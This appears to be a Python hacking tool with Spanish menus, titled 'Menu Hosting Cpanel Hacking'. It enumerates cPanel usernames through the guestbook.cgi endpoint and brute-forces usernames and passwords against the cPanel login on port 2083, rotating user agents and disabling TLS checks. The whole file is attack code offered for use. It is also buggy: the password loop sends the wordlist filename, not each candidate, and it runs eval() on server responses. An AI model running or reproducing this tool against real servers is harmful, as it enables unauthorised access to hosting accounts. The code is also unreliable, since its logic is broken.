#-*- coding: utf-8 -*-
import os
import sys
import time
import requests
import random
import urllib3

def logo():
	banner = """\033[1;35m                          
	    _     	 ____            ___   _  _  
	   / \    _ __  /  __| ___  ___ /   \ | \/ | 
	  / _ \  | '_ \ \__ \ / _ \/  _|| | |  \  /  
	 / ___ \ | | | | __| |  __/| |_ | | |  /  \  
	/_/   \_\|_| |_||____/\___|\___|\___/ |_/\_| \033[0m"""
	print (banner)


def menu():
	print("\n")
	print("""\033[1;31mMenu Hosting Cpanel Hacking\n \033[0m""")

	menu="""\033[1;34mSeleccione una Opcion:
   [1]: Verificar Usuario Cpanel
   [2]: Fuerza Bruta Usuario Cpanel
   [3]: Fuerza Bruta Password Cpanel
   [4]: Salir

Codigo By Ansec0x\033[0m
"""
	print (menu)

def Sistema():
	if os.name == "nt":
		os.system('cls')
	else:
		os.system('clear')

def verificar_cpanel(x):
	try:
		if x:
			time.sleep(0.2)
			cgi="cgi-sys/guestbook.cgi?user="
			link=x+cgi
			session=requests.Session()
			response=session.get(link)
			response_cgi=response.text
			Sistema()
			if 'Not Found' in response_cgi:
				print ("-------------------")
				print ("\n[*] No es Cpanel")
				print ("-------------------")
				return False
			else:
				return True

	except requests.exceptions.ConnectionError as e:
		print ("-----------------------------------------------------------------")
		print ("No olvidar ingresar el [/] al final de la URL http://hosting.com/")
		print ("-----------------------------------------------------------------")
		print ("\n")

def verificar_cpanel2(x):
	try:
		if x:
			time.sleep(0.2)
			requests.packages.urllib3.disable_warnings()
			url="https://"+x+":2083/login/?login_only=1"
			req=requests.get(url,verify=False)
			jsn=req.json()
			if 'status' in jsn:
				return True
			else:
				return False
			print(jsn) 
	except requests.exceptions.ConnectionError as e:
		time.sleep(0.2)
		print ("Error Ingrese URL Correcta")


def validar_usuario(x,y):
	try:
		if x:
			Sistema()
			if verificar_cpanel(x) == False:
				pass
			else:
				time.sleep(0.4)
				clave=y
				cgi="cgi-sys/guestbook.cgi?user="
				une=x+cgi
				link=une+y
				session=requests.Session()
				response=session.get(link)
				response_cgi=response.text
				real="/home/"+y
				if 'Invalid username' in response_cgi:
					print ("[+]Usuario InCorrecto: {}".format(y))
					print ("\n")
				elif real in response_cgi:
					print ("[+]Usuario Correcto: {}".format(y))
					r=response_cgi.split()
					print(r[4])
					print ("\n")

	except requests.exceptions.ConnectionError as e:
		pass

def bruteforce_usuario(x,y):
	try:
		if x:
			Sistema()
			if verificar_cpanel(x) == False:
				pass
			else:
				with open(y,'r') as f:
					password=f.read().splitlines()
				for crack in password:
					cgi="cgi-sys/guestbook.cgi?user="
					une=x+cgi
					link=une+crack
					session=requests.Session()
					response=session.get(link)
					response_cgi=response.text
					real="/home/"+y
					time.sleep(0.1)
					if 'Invalid username' in response_cgi:
						print ("[*]Verificando ... ")
					else:
						os.system('clear')
						print ("\n")
						print ("[+]Usuario Correcto: {}".format(crack))
						r=response_cgi.split()
						print(r[4])
						print ("\n")
						break;

	except :
		print ("Ingrese Wordlis Correcto\n")

def bruteforce_password(host,user,wordlist):
	userAge=["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/7.0.5 Safari/537.77.4",
             "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
             "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
             "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:31.0) Gecko/20100101 Firefox/31.0",
             "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
             "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
             "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
             "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:30.0) Gecko/20100101 Firefox/30.0",
             "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
             "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
             "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
             "Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36",
             "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0",
             "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36",
             "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
             "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53",
             "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
             "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0",
             "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
             "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0",
             "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.76.4 (KHTML, like Gecko) Version/7.0.4 Safari/537.76.4",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/538.46 (KHTML, like Gecko) Version/8.0 Safari/538.46",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
             "Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0",
             "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
             "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10",
             "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
             "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/6.1.5 Safari/537.77.4",
             "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/34.0.1847.116 Chrome/34.0.1847.116 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/6.1.5 Safari/537.77.4",
             "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0",
             "Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14",
             "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0",
             "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.74.9 (KHTML, like Gecko) Version/7.0.2 Safari/537.74.9",
             "Mozilla/5.0 (X11; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0",
             "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:31.0) Gecko/20100101 Firefox/31.0",
             "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0",
             "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:31.0) Gecko/20100101 Firefox/31.0",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14",
             "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
             "Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0",
             "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
             "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36",
             "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
             "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) GSA/4.1.0.31802 Mobile/11D257 Safari/9537.53",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:31.0) Gecko/20100101 Firefox/31.0",
             "Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0",
             "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36",
             "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0",
             "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
             "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36",
             "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/36.0.1985.125 Chrome/36.0.1985.125 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:30.0) Gecko/20100101 Firefox/30.0",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Safari/600.1.3",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36"]


	rand=random.choice(userAge)
	link="https://"+host+":2083/login/?login_only=1"
	urllib3.disable_warnings()
	params={}
	params['user']=user
	params['pass']=wordlist
	params['login'] = 'Log In'
	response=requests.post(link,data=params,verify=False,headers=rand)
	response.headers["User-Agent"] = rand
	texto=response.text
	eval(str(texto))
	dicc=eval(texto)
	if 'redirect' in dicc:
		print ("[+]Password Encontrado: ",wordlist)
	else:
		print ("[+]Password no Encontrado, intente otro Diccionario ")
	for an in dicc:
		print (str(an)," : ",str(dicc[an]))
	

	print ("\n")



def verificar_entrada_1(x):
	time.sleep(0.2)
	Sistema()
	if x.startswith("http://"):
		return True
	elif x.startswith("https://"):
		return True
	else:
		print ("----------------------------------------")
		print ("\nIngrese Url con [http://] y [https://]\n")
		print ("----------------------------------------")
		return False


def verificar_entrada_2(x):
	time.sleep(0.2)
	Sistema()
	if x.startswith("http://"):
		print ("\nIngrese Url Sin [http://]\n")
		return False
	elif x.startswith("https://"):
		print ("\nIngrese Url Sin [https://]\n")
		return False
	else:
		return True

#////////////////////////////////////////////////


def menu1():
	os.system('clear')
	data="""\n\033[1;36mOpcion [1] Verificiar Usuarios Cpanel
		
	Opciones de Ingreso:
	   [*]Ingresar Dominio Completo
	   		http/(https)://hosting.com/
	   [*]Ingresar Usuario\033[0m
	"""
	print (data)
	dominio=input("\n\033[1;34mIngrese URL:  \033[0m")
	verificar_entrada_1(dominio)
	if verificar_cpanel(dominio):
		usuario=input("\n\033[1;34mIngrese Usuario:  \033[0m")
		validar_usuario(dominio,usuario)
	else:
		pass

def menu2():
	Sistema()
	data="""\n\033[1;36mOpcion [2] Fuerza Bruta Usuario 
		
	Opciones de Ingreso:
	   [*]Ingresar Dominio Completo
	   		http/(https)://hosting.com/
	   [*]Ingresar Wordlis\033[0m
	"""
	print (data)
	dominio=input("\n\033[1;34mIngrese URL:  \033[0m")
	verificar_entrada_1(dominio)
	if verificar_cpanel(dominio):
		diccionario=input("\n\033[1;34mIngrese Wordlist:  \033[0m")
		bruteforce_usuario(dominio,diccionario)

def menu3():
	Sistema()
	data="""\n\033[1;36mOpcion [3] Fuerza Bruta Passord
		
	Opciones de Ingreso:
	   [*]Ingresar Solo dominio
	   		hosting.com
	   [*]Ingresar Usuario
	   [*]Ingresar Wordlist\033[0m
	"""
	print (data)

	dominio=input("\n\033[1;34mIngrese URL:  \033[0m")
	verificar_entrada_2(dominio)
	if verificar_cpanel2(dominio):
		username=input("\n\033[1;34mIngrese Usuario:  \033[0m")
		diccionario=input("\n\033[1;32mIngrese Wordlist:  \033[0m")

		with open(diccionario,'r') as f:
					password=f.read().splitlines()
		for crack in password:
			print ("Menu 3:",crack)
			bruteforce_password(dominio,username,diccionario)

if __name__=="__main__":
	logo()
	menu()
	while True:
	    try:
	        opcion= input("\033[0;32mMenu Opcion:  \033[0m")
	        opcion = int(opcion)
	        if opcion==1:
	        	menu1()
	        if opcion==2:
	        	menu2()
	        if opcion==3:
	        	menu3()
	        if opcion==4:
	        	Sistema()
	        	break

	    except ValueError:
	        pass
	    menu()
